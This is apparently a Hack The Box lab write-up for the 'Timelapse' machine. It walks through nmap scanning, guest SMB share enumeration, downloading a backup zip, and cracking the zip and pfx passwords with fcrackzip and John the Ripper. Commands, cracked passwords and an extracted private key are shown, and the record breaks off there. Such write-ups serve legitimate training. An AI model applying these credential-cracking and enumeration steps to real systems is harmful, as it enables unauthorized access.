---
permalink: /htb/timelapse
title: Timelapse
---

<br>

Small note: when using the UDP VPN sever I could not ping the machine but TCP worked. 

As always, begin with nmap:

```
[connor@fedora ~]$ nmap 10.10.11.152 -A
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 20:15 AEST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.64 seconds
[connor@fedora ~]$ nmap 10.10.11.152 -A -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 20:15 AEST
Nmap scan report for 10.10.11.152
Host is up (0.067s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-18 18:15:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-18T18:15:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.62 seconds
```

<br>

Note the SMB protocol - we can enumerate it with [smbmap](https://github.com/ShawnDEvans/smbmap):

<br>

```
[connor@fedora smbmap]$ python smbmap.py -H 10.10.11.152 -u guest

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: 10.10.11.152:445        Name: 10.10.11.152              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```

<br>

Next let's try access the READ ONLY disks.

<br>

```
[connor@fedora timelapse]$ smbclient //10.10.11.152/Shares
Password for [SAMBA\connor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct 26 01:39:15 2021
  ..                                  D        0  Tue Oct 26 01:39:15 2021
  Dev                                 D        0  Tue Oct 26 05:40:06 2021
  HelpDesk                            D        0  Tue Oct 26 01:48:42 2021

                6367231 blocks of size 4096. 2442478 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Tue Oct 26 05:40:06 2021
  ..                                  D        0  Tue Oct 26 05:40:06 2021
  winrm_backup.zip                    A     2611  Tue Oct 26 01:46:42 2021

                6367231 blocks of size 4096. 2442478 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (7.3 KiloBytes/sec) (average 7.3 KiloBytes/sec)
smb: \Dev\> ^C
[connor@fedora timelapse]$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

<br>

We find a password protected zip file. <br>

I used [fcrackzip](https://github.com/foreni-packages/fcrackzip) and rockyou:

<br>

```
[connor@fedora timelapse]$ time fcrackzip -D -u winrm_backup.zip -p rockyou.txt
sh: -c: line 1: unexpected EOF while looking for matching `"'
sh: -c: line 2: syntax error: unexpected end of file
sh: -c: line 1: unexpected EOF while looking for matching `"'
sh: -c: line 2: syntax error: unexpected end of file
sh: -c: line 1: unexpected EOF while looking for matching ``'
sh: -c: line 2: syntax error: unexpected end of file


PASSWORD FOUND!!!!: pw == supremelegacy

real    1m3.700s
user    0m21.971s
sys     0m39.765s
```

<br>

Now we can open it: 

<br>

```
[connor@fedora timelapse]$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
[connor@fedora timelapse]$ l
legacyy_dev_auth.pfx  rockyou.txt  winrm_backup.zip
```

<br>

It contains a pfx file. I didn't know what it was so I googled it: <https://www.google.com/search?q=pfx+file&oq=pfx+file> <br>
Then the first link told me how to extract private key: `openssl pkcs12 -in [yourfile.pfx] -nocerts -out [drlive.key]`

<br>

```
[connor@fedora timelapse]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
Enter Import Password:
```

<br>

But again it is password protected. <br>
I followed this to install johntheripper: https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-FEDORA <br>
Then managed to get the password: thuglegacy

```
[connor@fedora timelapse]$ python ~/Public/john/run/pfx2john.py legacyy_dev_auth.pfx > pfx_hash
[connor@fedora timelapse]$ time john -w=rockyou.txt pfx_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:03:03 DONE (2022-06-18 22:14) 0.005438g/s 17574p/s 17574c/s 17574C/s thuglife03282006..thug209
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

real    3m4.115s
user    10m9.072s
sys     0m2.833s
```

<br>

Now we have the private key:

```
[connor@fedora timelapse]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
[connor@fedora timelapse]$ cat priv.key 
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQInskoJp2TmPsCAggA
MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBBbc4EWTlVLVO7IkyZoDZV+BIIE
0OMR/8XuO1roOUx9f7nBBaoxG9qv/WbOjMhp7TwCFD3wKiH0aQjdOKg3ObKNdCI7
XzH5dMZYEmycxuKDo+pAtcyADt5giGpO6qUP1zjmlKeVO7rAAbtVpXm5XQMMFoao
lGAPZP4+LT9BjvcPVIvb/3PpDWs/hbywvE3I6ctzYC64lY6XTqpdTd/Lz3UBW1js
pJsWAz5bltokmYRvXioZ4syKa7FJK5WeqGP6AWftxQ7YjN1v6otSQczA8lSlAsUX
hOprqiSnaPuK1UJm73p3TW0GXyAQRsanWh2/YI8vMGHJpuDAqkqrrBYKv2oSfXCR
XH6VtQUsveK5SQe5/+5rRqwokyY7YiCsEvjNGh/IA+ukudr8m+qZT//A/fwnF2+D
SFjn2PGNyOgBu6QdchWtsBK9IOMPgKr9YBv3RGn4kaU4UKnPRZPcdS7vu8y7E9Yt
//F1CDbo3geRZGQb3tTBhb/vnS20197zj2SUsObJHjAAnkQxqywme7ZIeMfZLdpw
n0UVo1GQ87VnqhJP0O5B6aeLm6PIBSDRHC/o02c6w9jiCISUiJBC/z0pxp5R42an
vq20wFeGhfKuBYCfwsVtN/peBmdtTqAA0ECYMXteZCZmdQut+XkZ1f+bCZCro9h5
HEpxQOh4Bu2QO3LNkKmU86mT75i4KD/8f82sczv8FXIaWfLCZc+nvLnJsxVKy7/S
1XiEzPd9R9EA1kfErxRN09/dH6OD3S20bflZfwJZd/ohc3xo8n/967cJcO6IueVb
laJ9PVNQIeILomgXiFPEzQSWcb9kKYtPwoNYxOos1GYKQ3hXxyi2nkJGdFBx+mgk
Wluf8urYospy8u4gHih+wmVOnYG3tKE9cF3x22r5JoADodqGxTIR87ipQT4SeDUe
9XjcYFW5/SOcuQdJ+39187boXZd4EO+iJ9U03w2Bj0jrR3QgvIpDYCMtiILzbzkH
8xHbrqzdbWA7bEZt3FYPjY48eqI8eW7qyiIC1w9sX8dc8PIqVZ8FWXgdVSemoL1C
jkvNfVE827UdU5KqhuJuk8uH1vQ4tNjNz22xTP3hg8aUgFPo0giFqn8BZSWb0+uM
iWI12AJdpEA52AxXabZw7BxCRvYdQYgNcJaieR5JRH8BpwB2YJ2yaZ+Cu67ANvDa
BEYh9gkUN5laIpD+NovfW2AUYnkWR9nXGf4NOAfMHfluYQ94I/svjQ3AbVliQwzo
myvUmOIimEX+tnQHXYtuFsg4lwU3fo95s35E7fqUDKR3jxXwO/3SrqVlUG1bLCeS
HC/i4vImDxbWHlyUNFkECZte2uWg1NxpVIJZazCQbh3K7/UW0eqmgnETgyHxnk5L
IOUW//3L8yLU0/GSLYcmi1hBqTJXqyHTz8sy3ydelDiT864lfrsTUhFnV2OVHajj
VTqQsMwbUBWwGiO5D7i2Xo/FECQMy8OOqq7l4N5UBYG+f/XRwIYouyuhhE7cfxBp
THXRt2z/CKe95ojr+Rdb2dzj5a9ItXssCzXVeXOM+qWe+DGGBd4j4SWnUOmgy9CD
ZCC3YuUi1+nniU6tkwEa26/arb57wQ1oe6175J64C2B2A3cvuUbOQQ8JFGPQJHss
S3l+R+ePLcsoaEBR5nrAOa7ICiZ/g0WFj78cslLXKr4Z
-----END ENCRYPTED PRIVATE KEY-----
```
